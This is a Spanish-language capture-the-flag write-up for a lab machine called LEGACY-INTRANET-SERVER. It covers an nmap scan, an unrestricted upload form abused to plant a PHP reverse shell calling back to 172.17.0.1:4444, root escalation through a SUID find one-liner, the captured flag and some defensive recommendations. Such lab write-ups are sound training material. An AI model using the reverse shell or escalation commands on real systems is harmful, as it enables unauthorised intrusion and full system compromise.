# LEGACY-INTRANET-SERVER-.evidencia

Dificultad: Easy

IP: 172.17.0.2

Fecha de Resolución: 25/12/2025

Auditor: Dante Paz

## Objetivo
Comprometer el sistema y obtener la flag de root mediante técnicas de explotación de vulnerabilidades y escalada de privilegios.
## Enumeración
Escaneo de Puertos
bash
nmap -sV -sC 172.17.0.2
Servicios Identificados:

✅ 22/tcp - SSH

✅ 25/tcp - SMTP

✅ 80/tcp - HTTP (Sitio Web)

✅ 139/tcp - Samba

✅ 445/tcp - Samba

## Reconocimiento Web
Inspección del sitio web reveló un formulario de "Ticket de Soporte" con funcionalidad de carga de archivos sin restricciones.

## Vulnerabilidades Identificadas
### 1. Carga de Archivos sin Restricciones
Tipo: File Upload Vulnerability

Impacto: Crítico (RCE)

Descripción: El formulario web permite subir archivos arbitrarios sin validación de extensión o tipo MIME.

### 2. Binario SUID Mal Configurado
Binario: /usr/bin/find

Vulnerabilidad: SUID bit configurado para root

Impacto: Escalada de privilegios

Explotación
Fase 1: Acceso Inicial (Reverse Shell)
Payload PHP utilizado:

php
set_time_limit (0);
$VERSION = "1.0";
$ip = '172.17.0.1';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
Procedimiento:

Subir archivo rever.php con payload reverse shell

Archivo guardado en: uploads/rever.php

Acceder al archivo para ejecutar reverse shell

Conexión exitosa al sistema

Fase 2: Escalada de Privilegios
Técnica: Abuso de binario SUID find

Comandos utilizados:

bash
# Verificar permisos SUID
find / -perm -4000 2>/dev/null

# Explotar find SUID
/usr/bin/find . -exec /bin/sh -p \; -quit
Resultado: Shell con privilegios de root obtenida exitosamente.

Captura de Flag
Ubicación de la flag:

bash
cat /root/flag.txt
Flag Obtenida:

text
root.flag[gtfobins_suid_privesc_win]

Resultados
✅ Reverse Shell: Exitosa

✅ Escalada de Privilegios: Exitosa (root)

✅ Flag Capturada: Sí

✅ Compromiso Total del Sistema: Confirmado

🛡️ Recomendaciones de Seguridad
Para Desarrolladores:
✅ Implementar validación estricta de archivos subidos

✅ Validar extensiones y tipos MIME

✅ Almacenar archivos fuera del directorio web raíz

✅ Renombrar archivos subidos
